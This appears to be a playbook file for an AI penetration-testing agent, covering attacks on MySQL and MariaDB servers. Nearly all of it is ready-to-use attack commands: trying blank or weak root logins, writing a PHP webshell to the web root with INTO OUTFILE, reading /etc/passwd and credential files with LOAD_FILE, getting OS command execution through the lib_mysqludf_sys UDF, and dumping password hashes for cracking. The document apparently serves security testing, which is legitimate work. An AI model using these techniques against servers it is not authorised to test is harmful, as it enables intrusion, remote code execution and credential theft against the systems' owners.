---
name: mysql
services: [mysql, mariadb]
summary: MySQL/MariaDB — blank/weak root, FILE-priv file read/write to webshell, UDF RCE
---

# MySQL playbook

Connect with the `mysql` client via `local_exec` (or `run_script` for scripted queries).
The commands below are **examples** — compose your own from what you find.

## Connecting
Blank or weak `root` is common (`root:root`, or `root` with no password).
- Example: `local_exec("mysql -h <host> -u root -p<pw> -e 'SELECT version();'")` (no space after `-p`)

look for: a working login, and the account's privileges (next).

## Privilege & orient
- Example: `SELECT current_user(); SHOW GRANTS;`
- Example (databases): `SHOW DATABASES; SELECT table_schema, table_name FROM information_schema.tables;`

look for: the `FILE` privilege (enables file read/write below); `secure_file_priv` (empty = write anywhere).

## File write → webshell (FILE priv)
With FILE and a writable served directory, write a shell to disk, then request it. If the
write isn't a web root, convert per the foothold methodology.
- Example: `SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/s.php';`

look for: `secure_file_priv` empty/permissive and a known writable, served path.

## File read (FILE priv)
- Example: `SELECT LOAD_FILE('/etc/passwd');`

look for: readable config, keys, credentials.

## UDF → RCE
With write access to the plugin directory, a user-defined-function library (`lib_mysqludf_sys`)
gives `sys_exec()` for direct OS command execution.
- Example: place the `.so` in `@@plugin_dir`, `CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';`, `SELECT sys_exec('id');`

look for: a writable `@@plugin_dir` and FILE priv to place the library.

## Hashes & record
- Example: `SELECT user, authentication_string FROM mysql.user;` → feed `hashcat_crack`

Code-exec or file read/write = critical (benign proof). `record_credential` for recovered creds/hashes.
